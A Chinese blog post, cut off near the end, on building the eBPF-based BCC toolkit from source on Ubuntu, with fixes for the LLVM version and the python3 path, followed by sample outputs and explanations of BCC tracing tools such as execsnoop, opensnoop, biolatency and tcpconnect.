    <content type="html"><![CDATA[<h2 id="0x00-bcc介绍"><a class="markdownIt-Anchor" href="#0x00-bcc介绍"></a> 0x00 bcc介绍</h2><p>BCC 是一个基于ebpf的用于创建高效内核跟踪和操作程序的工具包，包括几个有用的工具和示例。</p><h2 id="0x01-基于源码构建bcc"><a class="markdownIt-Anchor" href="#0x01-基于源码构建bcc"></a> 0x01 基于源码构建bcc</h2><p>参考官方<a href="https://github.com/iovisor/bcc/blob/master/INSTALL.md">install.md</a></p><h3 id="安装构建依赖项"><a class="markdownIt-Anchor" href="#安装构建依赖项"></a> 安装构建依赖项</h3><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"> <span class="hljs-comment"># Trusty (14.04 LTS) and older</span><br>VER=trusty<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb http://llvm.org/apt/<span class="hljs-variable">$VER</span>/ llvm-toolchain-<span class="hljs-variable">$VER</span>-3.7 main</span><br><span class="hljs-string">deb-src http://llvm.org/apt/<span class="hljs-variable">$VER</span>/ llvm-toolchain-<span class="hljs-variable">$VER</span>-3.7 main&quot;</span> | \<br>  sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/llvm.list<br><span class="hljs-built_in">wget</span> <span class="hljs-literal">-O</span> - http://llvm.org/apt/llvm<span class="hljs-literal">-snapshot</span>.gpg.key | sudo apt<span class="hljs-literal">-key</span> add -<br>sudo apt<span class="hljs-literal">-get</span> update<br><br><span class="hljs-comment"># For Bionic (18.04 LTS)</span><br>sudo apt<span class="hljs-literal">-get</span> <span class="hljs-literal">-y</span> install bison <span class="hljs-built_in">build-essential</span> cmake flex git lib<span class="hljs-built_in">edit-dev</span> \<br>  libllvm6.<span class="hljs-number">0</span> llvm<span class="hljs-literal">-6</span>.<span class="hljs-number">0</span><span class="hljs-literal">-dev</span> libclang<span class="hljs-literal">-6</span>.<span class="hljs-number">0</span><span class="hljs-literal">-dev</span> python zlib1g<span class="hljs-literal">-dev</span> libelf<span class="hljs-literal">-dev</span> libfl<span class="hljs-literal">-dev</span> python3<span class="hljs-literal">-distutils</span><br><br><span class="hljs-comment"># For Eoan (19.10) or Focal (20.04.1 LTS)</span><br>sudo apt install <span class="hljs-literal">-y</span> bison <span class="hljs-built_in">build-essential</span> cmake flex git lib<span class="hljs-built_in">edit-dev</span> \<br>  libllvm7 llvm<span class="hljs-literal">-7</span><span class="hljs-literal">-dev</span> libclang<span class="hljs-literal">-7</span><span class="hljs-literal">-dev</span> python zlib1g<span class="hljs-literal">-dev</span> libelf<span class="hljs-literal">-dev</span> libfl<span class="hljs-literal">-dev</span> python3<span class="hljs-literal">-distutils</span><br>  <br><span class="hljs-comment"># For Hirsute (21.04)  or Impish (21.10)</span><br>sudo apt install <span class="hljs-literal">-y</span> bison <span class="hljs-built_in">build-essential</span> cmake flex git lib<span class="hljs-built_in">edit-dev</span>   libllvm11 llvm<span class="hljs-literal">-11</span><span class="hljs-literal">-dev</span> libclang<span class="hljs-literal">-11</span><span class="hljs-literal">-dev</span> python zlib1g<span class="hljs-literal">-dev</span> libelf<span class="hljs-literal">-dev</span> libfl<span class="hljs-literal">-dev</span> python3<span class="hljs-literal">-distutils</span><br><br><span class="hljs-comment"># For other versions</span><br>sudo apt<span class="hljs-literal">-get</span> <span class="hljs-literal">-y</span> install bison <span class="hljs-built_in">build-essential</span> cmake flex git lib<span class="hljs-built_in">edit-dev</span> \<br>  libllvm3.<span class="hljs-number">7</span> llvm<span class="hljs-literal">-3</span>.<span class="hljs-number">7</span><span class="hljs-literal">-dev</span> libclang<span class="hljs-literal">-3</span>.<span class="hljs-number">7</span><span class="hljs-literal">-dev</span> python zlib1g<span class="hljs-literal">-dev</span> libelf<span class="hljs-literal">-dev</span> python3<span class="hljs-literal">-distutils</span><br><br><span class="hljs-comment"># For Lua support</span><br>sudo apt<span class="hljs-literal">-get</span> <span class="hljs-literal">-y</span> install luajit luajit<span class="hljs-literal">-5</span>.<span class="hljs-number">1</span><span class="hljs-literal">-dev</span><br></code></pre></div></td></tr></table></figure><blockquote><p><strong>问题1</strong></p><p>但是目前llvm-7似乎不再被支持,采用llvm-7会一直报错，这个问题卡了我很久</p><p>后来采用的是llvm-11，即采用21.04对应的依赖，这样的话可以成功。</p><figure class="highlight q"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs q">sudo apt install -y bison build-essential cmake flex git libedit-<span class="hljs-built_in">dev</span>   libllvm11 llvm<span class="hljs-number">-11</span>-<span class="hljs-built_in">dev</span> libclang<span class="hljs-number">-11</span>-<span class="hljs-built_in">dev</span> python zlib1g-<span class="hljs-built_in">dev</span> libelf-<span class="hljs-built_in">dev</span> libfl-<span class="hljs-built_in">dev</span> python3-distutils<br></code></pre></div></td></tr></table></figure></blockquote><h3 id="安装和编译bcc"><a class="markdownIt-Anchor" href="#安装和编译bcc"></a> 安装和编译BCC</h3><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"> git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/iovisor/</span>bcc.git<br>mkdir bcc<span class="hljs-regexp">/build; cd bcc/</span>build<br>cmake ..<br>make -j `nproc` <span class="hljs-comment">#</span><br>sudo make install<br>cmake -DPYTHON_CMD=python3 .. <span class="hljs-comment"># build python3 binding</span><br>pushd src<span class="hljs-regexp">/python/</span><br>make<br>sudo make install<br>popd<br></code></pre></div></td></tr></table></figure><blockquote><p><strong>问题2</strong></p><p><img src="/posts/ae72ca8e/image-20220227193538882.png" alt="image-20220227193538882"></p><p>全部安装完成后测试可能会遇到如图所示的报错，原因是默认python环境为python,而我们的bcc被安装在python3下</p><p><img src="/posts/ae72ca8e/image-20220227193743842.png" alt="image-20220227193743842"></p><p>我们在python3下运行即可成功运行，要记得加sudo权限</p><p>也可以切换默认python</p><p>先删除默认的Python软链接：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo rm <span class="hljs-regexp">/usr/</span>bin/python<br></code></pre></div></td></tr></table></figure><p>然后创建一个新的软链接指向需要的Python版本：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo ln -s <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/python3.5 /u</span>sr<span class="hljs-regexp">/bin/</span>python<br></code></pre></div></td></tr></table></figure><p><img src="/posts/ae72ca8e/image-20220227193841252.png" alt="image-20220227193841252"></p></blockquote><h2 id="0x02-bcc部分工具实例"><a class="markdownIt-Anchor" href="#0x02-bcc部分工具实例"></a> 0x02 bcc部分工具实例</h2><p>参考<a href="https://github.com/iovisor/bcc/blob/master/docs/tutorial.md">tutorial.md</a></p><h3 id="before-bcc"><a class="markdownIt-Anchor" href="#before-bcc"></a> before bcc</h3><p>从一篇linux基础性能分析的文章开始<a href="https://netflixtechblog.com/linux-performance-analysis-in-60-000-milliseconds-accc10403c55">Linux Performance Analysis in 60,000 Milliseconds</a></p><p>这篇文章讲述了下面的命令</p><ol><li>uptime</li><li>dmesg | tail</li><li>vmstat 1</li><li>mpstat -P ALL 1</li><li>pidstat 1</li><li>iostat -xz 1</li><li>free -m</li><li>sar -n DEV 1</li><li>sar -n TCP,ETCP 1</li><li>top</li></ol><h3 id="11-execsnoop"><a class="markdownIt-Anchor" href="#11-execsnoop"></a> 1.1 execsnoop</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># ./execsnoop</span><br><span class="hljs-attribute">PCOMM</span>            PID    RET ARGS<br><span class="hljs-attribute">supervise</span>        <span class="hljs-number">9660</span>     <span class="hljs-number">0</span> ./run<br><span class="hljs-attribute">supervise</span>        <span class="hljs-number">9661</span>     <span class="hljs-number">0</span> ./run<br><span class="hljs-attribute">mkdir</span>            <span class="hljs-number">9662</span>     <span class="hljs-number">0</span> /bin/mkdir -p ./main<br><span class="hljs-attribute">run</span>              <span class="hljs-number">9663</span>     <span class="hljs-number">0</span> ./run<span class="hljs-meta"></span><br><span class="hljs-meta">[...]</span><br></code></pre></div></td></tr></table></figure><p>execsnoop 为每个新进程打印一行输出。检查短暂的进程。这些可能会消耗 CPU 资源，但不会出现在大多数定期拍摄正在运行的进程快照的监控工具中。</p><p>它通过跟踪 exec() 而不是 fork() 工作，因此它将捕获许多类型的新进程，但不是全部（例如，它不会看到应用程序启动工作进程，不会 exec() 其他任何东西） .</p><h3 id="12-opensnoop"><a class="markdownIt-Anchor" href="#12-opensnoop"></a> 1.2. opensnoop</h3><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-comment"># ./opensnoop</span><br>PID    COMM               FD ERR PATH<br><span class="hljs-number">1565</span>   redis-server        <span class="hljs-number">5</span>   <span class="hljs-number">0</span> <span class="hljs-regexp">/proc/</span><span class="hljs-number">1565</span>/stat<br><span class="hljs-number">1565</span>   redis-server        <span class="hljs-number">5</span>   <span class="hljs-number">0</span> <span class="hljs-regexp">/proc/</span><span class="hljs-number">1565</span>/stat<br><span class="hljs-number">1565</span>   redis-server        <span class="hljs-number">5</span>   <span class="hljs-number">0</span> <span class="hljs-regexp">/proc/</span><span class="hljs-number">1565</span>/stat<br><span class="hljs-number">1603</span>   snmpd               <span class="hljs-number">9</span>   <span class="hljs-number">0</span> <span class="hljs-regexp">/proc/</span>net/dev<br><span class="hljs-number">1603</span>   snmpd              <span class="hljs-number">11</span>   <span class="hljs-number">0</span> <span class="hljs-regexp">/proc/</span>net/if_inet6<br><span class="hljs-number">1603</span>   snmpd              -<span class="hljs-number">1</span>   <span class="hljs-number">2</span> <span class="hljs-regexp">/sys/</span>class<span class="hljs-regexp">/net/</span>eth0<span class="hljs-regexp">/device/</span>vendor<br><span class="hljs-number">1603</span>   snmpd              <span class="hljs-number">11</span>   <span class="hljs-number">0</span> <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/i</span>pv4<span class="hljs-regexp">/neigh/</span>eth0/retrans_time_ms<br><span class="hljs-number">1603</span>   snmpd              <span class="hljs-number">11</span>   <span class="hljs-number">0</span> <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/i</span>pv6<span class="hljs-regexp">/neigh/</span>eth0/retrans_time_ms<br><span class="hljs-number">1603</span>   snmpd              <span class="hljs-number">11</span>   <span class="hljs-number">0</span> <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/i</span>pv6<span class="hljs-regexp">/conf/</span>eth0/forwarding<br>[...]<br></code></pre></div></td></tr></table></figure><p>opensnoop 为每个 open() 系统调用打印一行输出，包括详细信息。</p><p>打开的文件可以告诉您很多关于应用程序如何工作的信息：识别它们的数据文件、配置文件和日志文件。有时，当应用程序不断尝试读取不存在的文件时，它们可能会出现异常行为并且性能不佳。opensnoop 让您快速浏览。</p><h3 id="13-ext4slower-or-btrfs-xfs-zfs"><a class="markdownIt-Anchor" href="#13-ext4slower-or-btrfs-xfs-zfs"></a> 1.3. ext4slower (or btrfs*, xfs*, zfs*)</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># ./ext4slower</span><br><span class="hljs-attribute">Tracing</span> ext<span class="hljs-number">4</span> operations slower than <span class="hljs-number">10</span> ms<br><span class="hljs-attribute">TIME</span>     COMM           PID    T BYTES   OFF_KB   LAT(ms) FILENAME<br><span class="hljs-attribute">06</span>:<span class="hljs-number">35</span>:<span class="hljs-number">01</span> cron           <span class="hljs-number">16464</span>  R <span class="hljs-number">1249</span>    <span class="hljs-number">0</span>          <span class="hljs-number">16</span>.<span class="hljs-number">05</span> common-auth<br><span class="hljs-attribute">06</span>:<span class="hljs-number">35</span>:<span class="hljs-number">01</span> cron           <span class="hljs-number">16463</span>  R <span class="hljs-number">1249</span>    <span class="hljs-number">0</span>          <span class="hljs-number">16</span>.<span class="hljs-number">04</span> common-auth<br><span class="hljs-attribute">06</span>:<span class="hljs-number">35</span>:<span class="hljs-number">01</span> cron           <span class="hljs-number">16465</span>  R <span class="hljs-number">1249</span>    <span class="hljs-number">0</span>          <span class="hljs-number">16</span>.<span class="hljs-number">03</span> common-auth<br><span class="hljs-attribute">06</span>:<span class="hljs-number">35</span>:<span class="hljs-number">01</span> cron           <span class="hljs-number">16465</span>  R <span class="hljs-number">4096</span>    <span class="hljs-number">0</span>          <span class="hljs-number">10</span>.<span class="hljs-number">62</span> login.defs<br><span class="hljs-attribute">06</span>:<span class="hljs-number">35</span>:<span class="hljs-number">01</span> cron           <span class="hljs-number">16464</span>  R <span class="hljs-number">4096</span>    <span class="hljs-number">0</span>          <span class="hljs-number">10</span>.<span class="hljs-number">61</span> login.defs<br></code></pre></div></td></tr></table></figure><p>ext4slower 跟踪 ext4 文件系统并计算常见操作，然后仅打印超过阈值的操作。</p><p>这对于识别或免除一种性能问题非常有用：通过文件系统单独显示慢速磁盘 i/O。磁盘异步处理 I/O，并且很难将该层的延迟与延迟应用程序体验相关联。在内核堆栈中向上跟踪，在 VFS -&gt; 文件系统接口处，将更接近地匹配应用程序所遭受的。使用此工具来确定文件系统延迟是否超过给定阈值。</p><p>bcc 中存在用于其他文件系统的类似工具：btrfsslower、xfsslower 和 zfsslower。还有fileslower，它在VFS层工作并跟踪所有内容（尽管开销更高）。</p><h3 id="14-biolatency"><a class="markdownIt-Anchor" href="#14-biolatency"></a> 1.4. biolatency</h3><figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap"><span class="hljs-comment"># ./biolatency</span><br>Tracing block device I/O... Hit Ctrl-C to end.<br>^C<br>     usecs           : count     distribution<br>      <span class="hljs-number"> 0 </span>-&gt;<span class="hljs-number"> 1 </span>       :<span class="hljs-number"> 0 </span>       |                                      |<br>      <span class="hljs-number"> 2 </span>-&gt;<span class="hljs-number"> 3 </span>       :<span class="hljs-number"> 0 </span>       |                                      |<br>      <span class="hljs-number"> 4 </span>-&gt;<span class="hljs-number"> 7 </span>       :<span class="hljs-number"> 0 </span>       |                                      |<br>      <span class="hljs-number"> 8 </span>-&gt;<span class="hljs-number"> 15 </span>      :<span class="hljs-number"> 0 </span>       |                                      |<br>     <span class="hljs-number"> 16 </span>-&gt;<span class="hljs-number"> 31 </span>      :<span class="hljs-number"> 0 </span>       |                                      |<br>     <span class="hljs-number"> 32 </span>-&gt;<span class="hljs-number"> 63 </span>      :<span class="hljs-number"> 0 </span>       |                                      |<br>     <span class="hljs-number"> 64 </span>-&gt;<span class="hljs-number"> 127 </span>     :<span class="hljs-number"> 1 </span>       |                                      |<br>    <span class="hljs-number"> 128 </span>-&gt;<span class="hljs-number"> 255 </span>     :<span class="hljs-number"> 12 </span>      |********                              |<br>    <span class="hljs-number"> 256 </span>-&gt;<span class="hljs-number"> 511 </span>     :<span class="hljs-number"> 15 </span>      |**********                            |<br>    <span class="hljs-number"> 512 </span>-&gt;<span class="hljs-number"> 1023 </span>    :<span class="hljs-number"> 43 </span>      |*******************************       |<br>   <span class="hljs-number"> 1024 </span>-&gt;<span class="hljs-number"> 2047 </span>    :<span class="hljs-number"> 52 </span>      |**************************************|<br>   <span class="hljs-number"> 2048 </span>-&gt;<span class="hljs-number"> 4095 </span>    :<span class="hljs-number"> 47 </span>      |**********************************    |<br>   <span class="hljs-number"> 4096 </span>-&gt;<span class="hljs-number"> 8191 </span>    :<span class="hljs-number"> 52 </span>      |**************************************|<br>   <span class="hljs-number"> 8192 </span>-&gt;<span class="hljs-number"> 16383 </span>   :<span class="hljs-number"> 36 </span>      |**************************            |<br>  <span class="hljs-number"> 16384 </span>-&gt;<span class="hljs-number"> 32767 </span>   :<span class="hljs-number"> 15 </span>      |**********                            |<br>  <span class="hljs-number"> 32768 </span>-&gt;<span class="hljs-number"> 65535 </span>   :<span class="hljs-number"> 2 </span>       |*                                     |<br>  <span class="hljs-number"> 65536 </span>-&gt;<span class="hljs-number"> 131071 </span>  :<span class="hljs-number"> 2 </span>       |*                                     |<br></code></pre></div></td></tr></table></figure><p>biolatency 跟踪磁盘 I/O 延迟（从设备发出到完成的时间），当工具结束时（Ctrl-C，或给定的时间间隔），它会打印延迟的直方图摘要。</p><p>这对于了解磁盘 I/O 延迟超出了 iostat 等工具给出的平均时间非常有用。I/O 延迟异常值将在分布结束时可见，以及多模式分布。</p><h3 id="15-biosnoop"><a class="markdownIt-Anchor" href="#15-biosnoop"></a> 1.5. biosnoop</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># ./biosnoop</span><br><span class="hljs-attribute">TIME</span>(s)        COMM           PID    DISK    T  SECTOR    BYTES   LAT(ms)<br><span class="hljs-attribute">0</span>.<span class="hljs-number">000004001</span>    supervise      <span class="hljs-number">1950</span>   xvda<span class="hljs-number">1</span>   W  <span class="hljs-number">13092560</span>  <span class="hljs-number">4096</span>       <span class="hljs-number">0</span>.<span class="hljs-number">74</span><br><span class="hljs-attribute">0</span>.<span class="hljs-number">000178002</span>    supervise      <span class="hljs-number">1950</span>   xvda<span class="hljs-number">1</span>   W  <span class="hljs-number">13092432</span>  <span class="hljs-number">4096</span>       <span class="hljs-number">0</span>.<span class="hljs-number">61</span><br><span class="hljs-attribute">0</span>.<span class="hljs-number">001469001</span>    supervise      <span class="hljs-number">1956</span>   xvda<span class="hljs-number">1</span>   W  <span class="hljs-number">13092440</span>  <span class="hljs-number">4096</span>       <span class="hljs-number">1</span>.<span class="hljs-number">24</span><br><span class="hljs-attribute">0</span>.<span class="hljs-number">001588002</span>    supervise      <span class="hljs-number">1956</span>   xvda<span class="hljs-number">1</span>   W  <span class="hljs-number">13115128</span>  <span class="hljs-number">4096</span>       <span class="hljs-number">1</span>.<span class="hljs-number">09</span><br><span class="hljs-attribute">1</span>.<span class="hljs-number">022346001</span>    supervise      <span class="hljs-number">1950</span>   xvda<span class="hljs-number">1</span>   W  <span class="hljs-number">13115272</span>  <span class="hljs-number">4096</span>       <span class="hljs-number">0</span>.<span class="hljs-number">98</span><br><span class="hljs-attribute">1</span>.<span class="hljs-number">022568002</span>    supervise      <span class="hljs-number">1950</span>   xvda<span class="hljs-number">1</span>   W  <span class="hljs-number">13188496</span>  <span class="hljs-number">4096</span>       <span class="hljs-number">0</span>.<span class="hljs-number">93</span><span class="hljs-meta"></span><br><span class="hljs-meta">[...]</span><br></code></pre></div></td></tr></table></figure><p>biosnoop 为每个磁盘 I/O 打印一行输出，详细信息包括延迟（从设备发出到完成的时间）。</p><p>这使您可以更详细地检查磁盘 I/O，并查找按时间排序的模式（例如，读取在写入之后排队）。请注意，如果您的系统以高速率执行磁盘 I/O，则输出将是冗长的。</p><h3 id="16-cachestat"><a class="markdownIt-Anchor" href="#16-cachestat"></a> 1.6. cachestat</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># ./cachestat</span><br>    <span class="hljs-attribute">HITS</span>   MISSES  DIRTIES  READ_HIT% WRITE_HIT%   BUFFERS_MB  CACHED_MB<br>    <span class="hljs-attribute">1074</span>       <span class="hljs-number">44</span>       <span class="hljs-number">13</span>      <span class="hljs-number">94</span>.<span class="hljs-number">9</span>%       <span class="hljs-number">2</span>.<span class="hljs-number">9</span>%            <span class="hljs-number">1</span>        <span class="hljs-number">223</span><br>    <span class="hljs-attribute">2195</span>      <span class="hljs-number">170</span>        <span class="hljs-number">8</span>      <span class="hljs-number">92</span>.<span class="hljs-number">5</span>%       <span class="hljs-number">6</span>.<span class="hljs-number">8</span>%            <span class="hljs-number">1</span>        <span class="hljs-number">143</span><br>     <span class="hljs-attribute">182</span>       <span class="hljs-number">53</span>       <span class="hljs-number">56</span>      <span class="hljs-number">53</span>.<span class="hljs-number">6</span>%       <span class="hljs-number">1</span>.<span class="hljs-number">3</span>%            <span class="hljs-number">1</span>        <span class="hljs-number">143</span><br>   <span class="hljs-attribute">62480</span>    <span class="hljs-number">40960</span>    <span class="hljs-number">20480</span>      <span class="hljs-number">40</span>.<span class="hljs-number">6</span>%      <span class="hljs-number">19</span>.<span class="hljs-number">8</span>%            <span class="hljs-number">1</span>        <span class="hljs-number">223</span><br>       <span class="hljs-attribute">7</span>        <span class="hljs-number">2</span>        <span class="hljs-number">5</span>      <span class="hljs-number">22</span>.<span class="hljs-number">2</span>%      <span class="hljs-number">22</span>.<span class="hljs-number">2</span>%            <span class="hljs-number">1</span>        <span class="hljs-number">223</span><br>     <span class="hljs-attribute">348</span>        <span class="hljs-number">0</span>        <span class="hljs-number">0</span>     <span class="hljs-number">100</span>.<span class="hljs-number">0</span>%       <span class="hljs-number">0</span>.<span class="hljs-number">0</span>%            <span class="hljs-number">1</span>        <span class="hljs-number">223</span><span class="hljs-meta"></span><br><span class="hljs-meta">[...]</span><br></code></pre></div></td></tr></table></figure><p>cachestat 每秒（或每个自定义间隔）打印一行摘要，显示来自文件系统缓存的统计信息。</p><p>使用它来识别低缓存命中率和高未命中率：这为性能调整提供了一个领先优势。</p><h3 id="17-tcpconnect"><a class="markdownIt-Anchor" href="#17-tcpconnect"></a> 1.7. tcpconnect</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># ./tcpconnect</span><br><span class="hljs-attribute">PID</span>    COMM         IP SADDR            DADDR            DPORT<br><span class="hljs-attribute">1479</span>   telnet       <span class="hljs-number">4</span>  <span class="hljs-number">127.0.0.1</span>        <span class="hljs-number">127.0.0.1</span>        <span class="hljs-number">23</span><br><span class="hljs-attribute">1469</span>   curl         <span class="hljs-number">4</span>  <span class="hljs-number">10.201.219.236</span>   <span class="hljs-number">54.245.105.25</span>    <span class="hljs-number">80</span><br><span class="hljs-attribute">1469</span>   curl         <span class="hljs-number">4</span>  <span class="hljs-number">10.201.219.236</span>   <span class="hljs-number">54.67.101.145</span>    <span class="hljs-number">80</span><br><span class="hljs-attribute">1991</span>   telnet       <span class="hljs-number">6</span>  ::<span class="hljs-number">1</span>              ::<span class="hljs-number">1</span>              <span class="hljs-number">23</span><br><span class="hljs-attribute">2015</span>   ssh          <span class="hljs-number">6</span>  fe<span class="hljs-number">80</span>::<span class="hljs-number">2000</span>:bff:fe<span class="hljs-number">82</span>:<span class="hljs-number">3</span>ac fe<span class="hljs-number">80</span>::<span class="hljs-number">2000</span>:bff:fe<span class="hljs-number">82</span>:<span class="hljs-number">3</span>ac <span class="hljs-number">22</span><span class="hljs-meta"></span><br><span class="hljs-meta">[...]</span><br></code></pre></div></td></tr></table></figure><p>tcpconnect 为每个活动的 TCP 连接（例如，通过 connect()）打印一行输出，详细信息包括源地址和目标地址。</p><p>寻找可能指向应用程序配置效率低下或入侵者的意外连接。</p><h3 id="18-tcpaccept"><a class="markdownIt-Anchor" href="#18-tcpaccept"></a> 1.8. tcpaccept</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># ./tcpaccept</span><br><span class="hljs-attribute">PID</span>    COMM         IP RADDR            LADDR            LPORT<br><span class="hljs-attribute">907</span>    sshd         <span class="hljs-number">4</span>  <span class="hljs-number">192.168.56.1</span>     <span class="hljs-number">192.168.56.102</span>   <span class="hljs-number">22</span><br><span class="hljs-attribute">907</span>    sshd         <span class="hljs-number">4</span>  <span class="hljs-number">127.0.0.1</span>        <span class="hljs-number">127.0.0.1</span>        <span class="hljs-number">22</span><br><span class="hljs-attribute">5389</span>   perl         <span class="hljs-number">6</span>  <span class="hljs-number">1234</span>:ab<span class="hljs-number">12</span>:<span class="hljs-number">2040</span>:<span class="hljs-number">5020</span>:<span class="hljs-number">2299</span>:<span class="hljs-number">0</span>:<span class="hljs-number">5</span>:<span class="hljs-number">0</span> <span class="hljs-number">1234</span>:ab<span class="hljs-number">12</span>:<span class="hljs-number">2040</span>:<span class="hljs-number">5020</span>:<span class="hljs-number">2299</span>:<span class="hljs-number">0</span>:<span class="hljs-number">5</span>:<span class="hljs-number">0</span> <span class="hljs-number">7001</span><span class="hljs-meta"></span><br><span class="hljs-meta">[...]</span><br></code></pre></div></td></tr></table></figure><p>tcpaccept 为每个被动 TCP 连接（例如，通过 accept()）打印一行输出，详细信息包括源地址和目标地址。</p><p>寻找可能指向应用程序配置效率低下或入侵者的意外连接。</p><h3 id="19-tcpretrans"><a class="markdownIt-Anchor" href="#19-tcpretrans"></a> 1.9. tcpretrans</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># ./tcpretrans</span><br><span class="hljs-attribute">TIME</span>     PID    IP LADDR:LPORT          T&gt; RADDR:RPORT          STATE<br><span class="hljs-attribute">01</span>:<span class="hljs-number">55</span>:<span class="hljs-number">05</span> <span class="hljs-number">0</span>      <span class="hljs-number">4</span>  <span class="hljs-number">10.153.223.157:22</span>    R&gt; <span class="hljs-number">69.53.245.40:34619</span>   ESTABLISHED<br><span class="hljs-attribute">01</span>:<span class="hljs-number">55</span>:<span class="hljs-number">05</span> <span class="hljs-number">0</span>      <span class="hljs-number">4</span>  <span class="hljs-number">10.153.223.157:22</span>    R&gt; <span class="hljs-number">69.53.245.40:34619</span>   ESTABLISHED<br><span class="hljs-attribute">01</span>:<span class="hljs-number">55</span>:<span class="hljs-number">17</span> <span class="hljs-number">0</span>      <span class="hljs-number">4</span>  <span class="hljs-number">10.153.223.157:22</span>    R&gt; <span class="hljs-number">69.53.245.40:22957</span>   ESTABLISHED<span class="hljs-meta"></span><br><span class="hljs-meta">[...]</span><br></code></pre></div></td></tr></table></figure><p>tcprerans 为每个 TCP 重传数据包打印一行输出，详细信息包括源地址和目标地址，以及 TCP 连接的内核状态。</p><p>TCP 重传会导致延迟和吞吐量问题。对于 ESTABLISHED 重传，寻找网络模式。对于 SYN_SENT，这可能指向目标内核 CPU 饱和和内核数据包丢失。</p><h3 id="110-runqlat"><a 